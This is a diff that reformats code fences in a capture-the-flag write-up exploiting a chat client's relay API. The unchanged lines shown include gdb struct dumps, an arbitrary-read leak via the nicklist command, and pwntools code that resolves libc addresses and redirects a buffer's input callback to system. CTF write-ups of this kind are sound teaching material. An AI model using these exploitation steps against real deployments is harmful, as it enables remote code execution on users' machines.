@@ -78,7 +78,7 @@ After the `eval` command completes, the allocation will be freed again, though m
 
 As for what to send, let's examine the `t_gui_buffer` structure. Here are the relevant fields and their corresponding offsets as shown by the `ptype` command in `gdb`:
 
-```
+```plaintext
 (gdb) ptype/ox struct t_gui_buffer
 /* offset  |    size */  type = struct t_gui_buffer {
                            ...
@@ -97,7 +97,7 @@ The plan is to point `input_callback` to the `system` function in the C standard
 
 To locate `system` we need a way of reading from an arbitrary address. This can be accomplished with the `nicklist` command, which walks through a linked list of `t_gui_nick_group` structures starting at `nicklist_root`.
 
-```
+```plaintext
 (gdb) ptype struct t_gui_nick_group
 type = struct t_gui_nick_group {
     char *name;
@@ -133,7 +133,7 @@ def leak(addr):
 
 `system` can be found by starting at `relay_buffer->input_callback`, which holds the address of the `relay_buffer_input_cb` function in `relay.so`, then reading the address of a function in `libc.so` from `relay.so`'s global offset table.
 
-```
+```python
 relay.address = leak(relay_buffer + 0x100) - relay.symbols["relay_buffer_input_cb"]
 libc.address = leak(relay.symbols["got.ctime"]) - libc.symbols["ctime"]
 log.info(f"{relay.address=:#x}")
@@ -155,6 +155,8 @@ io.sendline(f"input {hole:#x} asdf".encode())
 log.success(io.recvregex(b"(flag\{.*\})", capture=True)[1].decode())
 ```
 
-The full exploit can be found [here](solve.py). Running it yields the flag: 
+The full exploit can be found [here](solve.py). Running it yields the flag:
 
-`flag{i_cant_believe_i_had_to_patch_out_checks_in_an_api_that_takes_pointers_over_the_wire}`
+```plaintext
+flag{i_cant_believe_i_had_to_patch_out_checks_in_an_api_that_takes_pointers_over_the_wire}
+```
